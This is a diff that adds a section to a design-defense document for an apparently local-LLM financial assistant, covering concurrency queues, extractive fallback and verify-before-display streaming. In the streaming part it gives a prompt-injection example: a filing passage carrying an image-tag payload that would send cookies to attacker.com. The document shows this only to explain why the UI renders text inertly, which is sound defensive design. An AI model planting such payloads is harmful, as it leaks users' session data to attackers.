@@ -409,3 +409,66 @@ Under our offline fault injection test (`tests/integration/test_offline_survivab
 - **Our Enforced Defense**: Foundation Lock 2 is structurally enforced: `AnswerWriterAgent` has strictly zero tools (`tools = []`) and zero access to SQL drivers or execution libraries. The model cannot call database functions or write SQL strings. All SQL queries are executed exclusively by internal domain services using hardcoded, parameterized SQL statements with strongly-typed enumerations (`KPI_ID_ENUM`, `TICKER_ENUM`).
 
 
+
+
+---
+
+# Section 6: Phase 6 Defense: Concurrency, Fallback & Progressive Streaming
+
+## 1. Concurrency (Lock Crowd)
+
+### Three Live Executive Questions:
+1. **"What happens when 30 CFOs concurrently request complex qualitative disclosures during an earnings call?"**
+   - *Defense*: The architecture enforces a bounded semaphore queue sized to the physical hardware capacity (16 slots). The first 16 requests are admitted to active model slots. The next 16 requests wait in an in-memory queue buffer. The remaining requests are shed immediately with HTTP 429 Too Many Requests and an authoritative `Retry-After: 5` header. No connections hang, no memory thrashing occurs, and the system degrades gracefully under surge.
+2. **"How do you guarantee that a burst of narrative requests doesn't block sub-millisecond structured KPI lookups?"**
+   - *Defense*: 100% Queue Bypass. Structured KPI lookups require zero LLM calls and execute in ~0.33 ms directly via certified SQL template rendering. They never enter the bounded LLM semaphore and can sustain over 2,000 QPS even when all 16 LLM inference slots are 100% saturated.
+3. **"Why is the concurrency queue sized to 16 in-flight and 16 waiting rather than unlimited?"**
+   - *Defense*: Unbounded queues are an anti-pattern that leads to memory exhaustion and multi-minute request latencies. With 16 server slots and an average single-stream narrative latency of ~4.5s, the system clears 16 waiting requests in ~4.5 seconds. Allowing more than 16 in the waiting buffer would exceed the CFO's 10-second wait tolerance deadline.
+
+### Three Ways to Break Concurrency & How We Defend:
+1. **Break Attempt: Dispatching 100 simultaneous narrative requests to induce process crash (OOM).**
+   - *How We Defend*: The admission lock checks `waiting_count >= 16`. The excess 68 requests are rejected in $< 2\text{ ms}$ with standard `ErrorEnvelope(code='QUEUE_SATURATED')` and `Retry-After: 5`. The resident memory footprint of `llama-server` and FastAPI remains flat.
+2. **Break Attempt: Slow generation starvation.**
+   - *How We Defend*: Per-request generation deadlines (25.0s timeout) and queue wait deadlines (10.0s timeout). Any request exceeding its deadline is cancelled, its slot released, and a degraded extractive fallback returned.
+3. **Break Attempt: Client disconnection mid-generation leaking slots.**
+   - *How We Defend*: Execution runs inside a structured `try...finally` block. If the client disconnects or an `asyncio.CancelledError` is raised, `queue.release()` is guaranteed to execute, restoring the semaphore permit immediately.
+
+---
+
+## 2. Fallback (Lock Fallback)
+
+### Three Live Executive Questions:
+1. **"If the local open-weight model server crashes or runs out of VRAM, does the CFO get an error or a hallucinated answer?"**
+   - *Defense*: Neither. The platform implements an authoritative extractive fallback (`AnswerComposer.compose_fallback_answer()`). If the model server is unreachable, times out, or throws an OOM exception, the system instantly ships certified deterministic KPIs alongside verbatim, quoted filing passages with citations and authority labels, flagged with `degraded=true`. Zero hallucination is possible.
+2. **"Why is an extractive fallback acceptable for narrative questions when the LLM is down?"**
+   - *Defense*: In financial auditing, a direct quote from Form 10-K with exact source filing citations and page references is superior to a model-generated summary. The CFO obtains immediate ground truth without waiting for server maintenance.
+3. **"How do you prevent the system from returning outdated unamended numbers during an outage?"**
+   - *Defense*: The extractive fallback queries the exact same conflict policy resolution engine (`effective_line_items`) and certified KPI store as the normal pipeline. Rule R2 (Form 10-Q/A amendments override unamended data) remains 100% active.
+
+### Three Ways to Break Fallback & How We Defend:
+1. **Break Attempt: Killing the local LLM server process (`llama-server`) during active requests.**
+   - *How We Defend*: `RequestLifecycleManager` catches TCP connection failures (`httpx.ConnectError`), increments `cfo_copilot_degraded_total`, and delivers the extractive fallback in $< 50\text{ ms}$.
+2. **Break Attempt: Forcing an Out-Of-Memory (OOM) slot error via oversized prompt context.**
+   - *How We Defend*: If `llama-server` returns a slot error or context limit exception, the agent executes an automatic retry with top 1 chunk (reduced context); if that fails, it serves the extractive fallback.
+3. **Break Attempt: Total PostgreSQL database outage.**
+   - *How We Defend*: Data-dependent requests return HTTP 503 `DATABASE_UNAVAILABLE` with `Retry-After: 5`. The liveness probe (`/v1/health`) remains 200 OK, preventing container orchestrators (Kubernetes/Docker) from entering a destructive crash-restart loop.
+
+---
+
+## 3. Progressive Streaming (Lock Door)
+
+### Three Live Executive Questions:
+1. **"Why don't you stream raw model tokens to the CFO as they are generated, like ChatGPT does?"**
+   - *Defense*: **Verify-before-display invariant**. A financial assistant cannot stream speculative, unverified numbers to an executive. If the model streams a hallucinated margin before the verifier can inspect it, the CFO has already seen a false figure. We stream progressive stages: metadata $\rightarrow$ immediate facts block $\rightarrow$ progress $\rightarrow$ verified answer $\rightarrow$ final envelope. Unverified model tokens never reach the screen.
+2. **"How do you reconcile 'TTFT < 2s' with a local 3B model that takes 4.5 seconds to generate an answer?"**
+   - *Defense*: We report two numbers with complete honesty. The assignment's TTFT constraint is met via **Time to First Content**: the immediate deterministic facts and passage block is delivered via SSE in $< 50\text{ ms}$. The **Time to Verified Answer** takes ~4.5s for narrative synthesis due to local decode speeds (25.9 tok/s).
+3. **"What happens if malicious prompt-injected text is embedded in a retrieved filing passage?"**
+   - *Defense*: Plain text UI rendering. The UI binds all received texts strictly via `element.textContent = ...`. Any injected HTML tags, scripts, or markdown image exfiltration payloads (`<img src="https://attacker.com/leak?cookie=...">`) are rendered as inert text characters, neutralizing exfiltration attacks.
+
+### Three Ways to Break Streaming & How We Defend:
+1. **Break Attempt: Emitting unverified candidate tokens before grounding check.**
+   - *How We Defend*: Architectural layering. `AnswerWriterAgent` output is held in Python memory and passed to `AnswerVerifier` before any `answer` SSE event is emitted.
+2. **Break Attempt: Markdown/HTML injection via malicious filing corpus text.**
+   - *How We Defend*: The web client contains zero Markdown parsers and zero `innerHTML` calls. Every string is rendered strictly as plain text.
+3. **Break Attempt: Client aborts SSE connection to leak server resources.**
+   - *How We Defend*: The SSE generator detects stream cancellation, terminates background generation, and immediately returns the acquired concurrency permit to the bounded queue.
